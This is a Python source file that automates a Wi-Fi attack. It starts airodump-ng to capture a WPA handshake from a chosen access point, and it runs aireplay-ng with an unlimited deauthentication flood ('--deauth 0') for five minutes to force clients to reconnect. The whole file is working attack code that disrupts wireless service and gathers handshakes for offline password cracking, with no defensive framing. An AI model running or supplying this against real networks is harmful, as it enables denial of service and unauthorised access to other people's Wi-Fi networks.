import subprocess
import time
import os
import shutil
import threading

def capture_handshake(write_prefix, channel, bssid, interface, stop_event=None, write_dir=".", timeout=300):
    """
    - Capture WPA handshake using airodump-ng.
    - Stops when handshake is detected, when stop_event is set (deauth finished),
      or when timeout seconds have elapsed.
    - DOES NOT set the stop_event — it will not stop the deauth attack.
    - Returns the .cap file path if handshake is found, else None.
    """
    if not shutil.which("airodump-ng"):
        print("[!] airodump-ng not found in PATH")
        return None

    os.makedirs(write_dir, exist_ok=True)
    full_prefix = os.path.join(write_dir, write_prefix)
    cmd = [
        "airodump-ng",
        "--bssid", bssid,
        "-c", str(channel),
        "-w", full_prefix,
        interface
    ]
    print("[*] Starting airodump-ng:", " ".join(cmd))
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    handshake_found = False
    start = time.time()

    try:
        while True:
            # stop if deauth signalled it finished
            if stop_event and stop_event.is_set():
                print("[-] Stopping handshake capture: deauth finished.")
                break
            # stop if timeout reached
            if timeout and (time.time() - start) > timeout:
                print("[-] Handshake capture timeout reached.")
                break

            line = process.stdout.readline()
            if not line:
                if process.poll() is not None:
                    break
                time.sleep(0.1)
                continue
            l = line.lower()
            if "wpa handshake" in l:
                handshake_found = True
                print("[+] Handshake detected.")
                # return early from capture, but DO NOT set stop_event (deauth keeps running)
                break
    finally:
        try:
            if process.poll() is None:
                process.terminate()
                process.wait(timeout=3)
        except Exception:
            try:
                process.kill()
            except Exception:
                pass

    cap_file = f"{full_prefix}-01.cap"
    if handshake_found and os.path.exists(cap_file):
        print(f"[+] Capture file: {cap_file}")
        return os.path.abspath(cap_file)
    return None

def deauth_attack(bssid, interface, stop_event, duration=300):
    """
    Launches a deauth attack using aireplay-ng.
    Runs for `duration` seconds (default 300 = 5 minutes) then stops and sets stop_event.
    """
    if not shutil.which("aireplay-ng"):
        print("[!] aireplay-ng not found in PATH")
        stop_event.set()
        return

    cmd = [
        "aireplay-ng",
        "--deauth", "0",
        "-a", bssid,
        interface
    ]
    print("[*] Starting aireplay-ng:", " ".join(cmd))
    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        start = time.time()
        while True:
            if time.time() - start > duration:
                print(f"[*] {duration} seconds elapsed, stopping deauth attack.")
                break
            if process.poll() is not None:
                break
            time.sleep(1)
    finally:
        try:
            if process.poll() is None:
                process.terminate()
                process.wait(timeout=3)
        except Exception:
            try:
                process.kill()
            except Exception:
                pass
        stop_event.set()
        print("[*] Aireplay-ng stopped.")